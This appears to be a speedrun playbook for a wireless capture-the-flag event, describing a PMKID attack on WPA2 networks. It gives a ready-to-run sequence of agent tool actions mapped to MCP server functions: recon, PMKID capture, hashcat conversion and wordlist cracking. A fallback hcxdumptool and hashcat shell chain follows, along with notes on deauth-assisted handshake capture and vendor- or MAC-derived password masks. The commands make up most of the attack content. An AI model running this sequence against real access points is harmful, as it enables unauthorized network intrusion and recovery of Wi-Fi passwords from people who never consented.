# PMKID fastpath — the WCTF speedrun

## Recognition

Beacon RSN IE has PMKID Count > 0, or (more commonly) beacon says 0
but M1 in an actual association carries one. Best check: capture
one M1 with hcxdumptool and look at the EAPOL-Key IE.

## The one-shot sequence

```python
run_sequence([
    {"action": "recon_start", "band": "2.4", "dwell_ms": 250},
    {"action": "wait", "s": 15},
    {"action": "recon_stop"},
    {"action": "capture_pmkid", "bssid": "AA:BB:CC:DD:EE:FF",
     "timeout_s": 60},
    {"action": "convert_to_hashcat", "mode": 22000,
     "pcap_path": "/tmp/pmkid.pcapng",
     "out_path": "/tmp/hs.22000"},
    {"action": "crack_start",
     "hash_path": "/tmp/hs.22000",
     "wordlist_path": "/opt/wordlists/rockyou.txt",
     "mode": 22000},
])
```

## The flag surface

The recovered PSK is almost always the flag directly. If it isn't,
it decrypts a target frame in the capture that contains the flag
(use Wireshark `wlan.enable_decryption` with the PSK + ESSID).

## When the fastpath breaks

- **AP suppresses PMKID.** `hcxpcapngtool --info` reports no PMKID
  hash lines. Fall back to 4-way capture via `capture_handshake`.
- **PSK not in rockyou.** Move to masks + SSID-derived wordlists
  (see cracking-tradecraft — future write). Try common patterns:
  `<vendor_prefix><4-digit><4-digit>`, MAC-suffix derivations.

## MCP mapping

All actions in the sequence above map to real tools in `src/`:

- `recon_start` / `recon_stop` → `server.recon_start` / `server.recon_stop`.
- `capture_pmkid` → `server.do_capture_pmkid` (SSH-backed hcxdumptool).
- `capture_handshake` → `server.do_capture_handshake` (SSH-backed
  hcxdumptool + optional deauth).
- `convert_to_hashcat` → `server.convert_to_hashcat` / `server.extract_pmkids`.
- `crack_start` → `server.crack_start` (hashcat 22000).

Also available as `run_sequence` actions with identical parameter names —
see `orchestrate.py::_dispatch`.

## Fallback shell chain (no MCP)

```bash
# on the Pineapple / attack host
sudo hcxdumptool -i wlan1 -c 6a --bpf=<bpf-filter> \
    -w /tmp/pmkid.pcapng --enable_status=1
# stop after ~60 s; run:
hcxpcapngtool -o /tmp/hs.22000 /tmp/pmkid.pcapng
hashcat -m 22000 /tmp/hs.22000 /opt/wordlists/rockyou.txt
```

## Cite

- attacks.json: `pmkid-capture`.
- Steube 2018.
